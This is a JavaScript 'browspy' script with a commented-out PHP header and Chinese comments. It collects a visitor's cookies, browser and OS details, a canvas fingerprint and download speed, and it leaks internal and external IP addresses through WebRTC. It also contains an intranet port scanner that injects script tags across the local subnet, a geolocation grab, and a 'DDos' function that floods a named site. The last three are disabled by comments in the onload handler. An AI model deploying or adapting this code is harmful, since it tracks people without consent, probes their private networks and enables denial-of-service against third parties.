/*
<?php

if (isset($_GET['lat'])) {

    // 根据经纬度判断详细位置
    $lat=$_GET['lat'];
    $lon=$_GET['lon'];
    // 百度经纬度查询地址
    // 请求方式：GET
    // 默认返回json
    $url='http://lbs.juhe.cn/api/getaddressbylngb?lngx='.$lon.'&lngy='.$lat;
    $result=file_get_contents($url);
    $json=json_decode($result);
    exit($json->row->result->formatted_address);
}

$IP=$_SERVER[REMOTE_ADDR];
$USER_AGENT=$_SERVER[HTTP_USER_AGENT];

// 根据ip查询位置
$url='http://ip.taobao.com/service/getIpInfo.php?ip='.$IP;
$result=file_get_contents($url);
$json=json_decode($result);

$COUNTRY=$json->data->country;
$REGION=$json->data->region;
$CITY=$json->data->city;

?>
*/

var info={
    ip:null,
    inner_ip:null,
    intranet: [],
    /*
    ip_addr:{
        country:'<?=$COUNTRY?>',
        region:'<?=$REGION?>',
        city:'<?=$CITY?>',
    },
    */
    agent:null,
    geo:{
        support:null,
        error_code:null,
        lat:null,
        lon:null,
        address:null,
    },
    cookie:null,
    time:null,
    canvas_id:null,
    platform:null,
    device:null,
    window_screen:null,
    download_speed:null,
};

info.cookie=document.cookie;
info.time=(new Date()).toString();
info.agent=navigator.userAgent;

function browspyajax(url,foo){
    var xmlhttp=new XMLHttpRequest();
    xmlhttp.onreadystatechange=function(){
        if (xmlhttp.readyState==4 && xmlhttp.status==200) {
            foo(xmlhttp.responseText);
        };
    };
    xmlhttp.open('GET',url,true);
    xmlhttp.send();
}

function bin2hex(bin){
    var i=0, l=bin.length,chr,hex='';
    for (i; i < l; ++i){
        chr=bin.charCodeAt(i).toString(16);
        hex+=chr.length<2 ? '0'+chr : chr;
    }
    return hex;
}

function detectOS(){
    var sUserAgent=navigator.userAgent;
    var isWin = (navigator.platform == "Win32") || (navigator.platform == "Windows");

    var isMac = (navigator.platform == "Mac68K") || (navigator.platform == "MacPPC") || (navigator.platform == "Macintosh") || (navigator.platform == "MacIntel");
    if (isMac) return "Mac";

    var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
    if (bIsIpad) return "iPad";
    
    var isUnix = (navigator.platform == "X11") && !isWin && !isMac;
    if (isUnix) return "Unix";
    
    var isLinux = (String(navigator.platform).indexOf("Linux") > -1);
    var bIsAndroid = sUserAgent.toLowerCase().match(/android/i) == "android";
    if (isLinux) {
        if(bIsAndroid) return "Android";
        else return "Linux";
    }

    var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
    if (bIsCE) return "WinCE";

    var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
    if (bIsWM) return "WinMobile";

    if (isWin) {
        var isWin2K = sUserAgent.indexOf("Windows NT 5.0") > -1 || sUserAgent.indexOf("Windows 2000") > -1; 
        if (isWin2K) return "Win2000";

        var isWinXP = sUserAgent.indexOf("Windows NT 5.1") > -1 || sUserAgent.indexOf("Windows XP") > -1; 
        if (isWinXP) return "WinXP";

        var isWin2003 = sUserAgent.indexOf("Windows NT 5.2") > -1 || sUserAgent.indexOf("Windows 2003") > -1; 
        if (isWin2003) return "Win2003";

        var isWinVista= sUserAgent.indexOf("Windows NT 6.0") > -1 || sUserAgent.indexOf("Windows Vista") > -1; 
        if (isWinVista) return "WinVista";

        var isWin7 = sUserAgent.indexOf("Windows NT 6.1") > -1 || sUserAgent.indexOf("Windows 7") > -1; 
        if (isWin7) return "Win7";

        var isWin8 = sUserAgent.indexOf("Windows NT 6.2") > -1 || sUserAgent.indexOf("Windows 8") > -1;
        if (isWin8) return "Win8";
    }

    return "Unknow";
}

function send_info(){
    var jsonText=JSON.stringify(info);
    console.log(jsonText);
}

// 获取屏幕分辨率的宽高,并判断操作系统,设备型号
function device_platform(){
    info.platform=detectOS();
    info.window_screen=String(window.screen.width)+'x'+String(window.screen.height);
}

// DDos攻击
function DDos(site){
    // CSRF
    setInterval(browspyajax(site,function(){
        console.log('DDos ',site);
    }),50);
}

// 获取IP地址，第一个是内网ip，第二个是外网ip
function getIPs(callback){
    var ip_dups = {};
    var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
    var mediaConstraints = {
        optional: [{RtpDataChannel: true}]
    };
    var servers = undefined;
    var i = 0;
    if(window.webkitRTCPeerConnection) servers = {iceServers: [{urls:"stun:stun.services.mozilla.com"}]};
    var pc = new RTCPeerConnection(servers, mediaConstraints);
    pc.onicecandidate = function(ice){
        if(ice.candidate){
            var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/
            var ip_addr = ip_regex.exec(ice.candidate.candidate)[1];
            if (ip_dups[ip_addr] === undefined) callback(ip_addr, i++);
            ip_dups[ip_addr] = true;
        }
    };
    pc.createDataChannel("");
    pc.createOffer(function(result){
        pc.setLocalDescription(result, function(){});
    }, function(){});
}

function get_ip_addr(){
    getIPs(function(ip, i){
        if(i == 0) info.inner_ip = ip;
        else if(i == 1) info.ip = ip;
    });
}

// 内网扫描
function intranet_scan(){
    // 常见端口
    var ports = [21,22,23,25,43,80,110,137,138,139,161,170,220,443,3306,8080];
    var body = document.getElementsByTagName("body")[0];

    getIPs(function(ip, id){
        if (id == 0) {
            ip = ip.split(".");
            ip.pop();
            ip = ip.join(".");
            for (var i = 1; i < 255; i++) {
                for (var p of ports) {
                    var script = document.createElement("script");
                    var host = ip + "." + i + ":" + p;
                    script.src = "http://" + host;
                    script.onload = "info.intranet.push('"+host+"')";
                    body.appendChild(script);
                }
            }
        }
    });
}

// 利用canvas定位唯一标识
function canvas_id(){
    var canvas=document.createElement('canvas');
    var ctx=canvas.getContext('2d');
    var txt='http://ktsee.com';
    ctx.textBaseline='top';
    ctx.font="14px 'Arial'";
    ctx.fillStyle='#0ff';
    ctx.fillRect(0,0,140,50);
    ctx.fillStyle='#00f';
    ctx.fillText(txt,2,15);
    ctx.fillStyle='rgba(102,204,0,0.7)';
    ctx.fillText(txt,4,17);

    var b64=canvas.toDataURL().replace('data:image/png;base64,','');
    var bin=atob(b64);
    var crc=bin2hex(bin.slice(-16,-12));
    console.log('Canvas id: '+crc);
    info.canvas_id=crc;
}

// 获取地理位置
function get_geolocation(){

    // check for Geolocation support
    function check_geolocation_support(){
        if (navigator.geolocation){
            console.log('Geolocation is supported!');
            return true;
        }
        else{
            console.log('Geolocation is not supported for this Browser/OS version yet.');
            return false;
        }
    }

    if (check_geolocation_support()) {

        info.geo.support=true;

        var geoOptions={
            maximumAge:5*60*1000,
            timeout:10*1000,
            enableHighAccuracy:true
        }
        var geoSuccess=function(position){
            info.geo.lat=position.coords.latitude;
            info.geo.lon=position.coords.longitude;
            console.log('Success get geolocation!');

            // 根据经纬度判断详细位置
            //url='<?=$_SERVER[PHP_SELF]?>?lat='+info.geo.lat+'&lon='+info.geo.lon;
            //browspyajax(url,function(addr){
            //    info.geo.address=addr;
            //});
        };
        var geoError=function(error){
            info.geo.error_code=error.code;
            console.log('Error occurred. Error code:'+error.code);
            //error.code:
            // 0: 未知错误
            // 1: 权限不足
            // 2: 位置错误(位置供应商出错)
            // 3: 超时
        };
        navigator.geolocation.getCurrentPosition(geoSuccess,geoError,geoOptions);
    }
    else{
        info.geo.support=false;
    };

}

// 网络测速
function network_speed(){
    // 图片测速
    var image=new Image();
    // 图片大小: 1232.7kb
    size=1232.7;
    image.src='http://cdn.ktsee.com/libs/browspy/speedtest.jpg';
    startTime=new Date().getTime();
    
    // 图片加载完毕
    image.onload=function(){
        endTime=new Date().getTime();
        // kb/s
        speed=size/((endTime-startTime)/1000);
        // 保留一位小数
        speed=parseInt(speed*10)/10;
        info.download_speed=speed+'kb/s';
        console.log('Download speed testing finished!');
    }

    /*
    // 音频测速
    var audio=new Audio();
    // 大小: 1.3M
    size=1235.87;
    audio.src='http://cdn.ktsee.com/libs/browspy/speedtest.mp3';
    audio.volume=0;
    audio.play();

    startTime=new Date().getTime();

    var timer;
    timer=setInterval(function(){
        if (audio.networkState==1) {
            endTime=new Date().getTime();
            speed=size/((endTime-startTime)/1000);
            speed=parseInt(speed*10)/10;
            info.download_speed=speed+'kb/s';

            console.log('Download speed testing finished!');
            audio.stop();
            clearInterval(timer);
        };
    },100);
    */
}

window.onload=function(){
    device_platform();
    get_ip_addr();
    //intranet_scan();
    canvas_id();
    //get_geolocation();
    network_speed();
    //DDos('http://baidu.com');
};
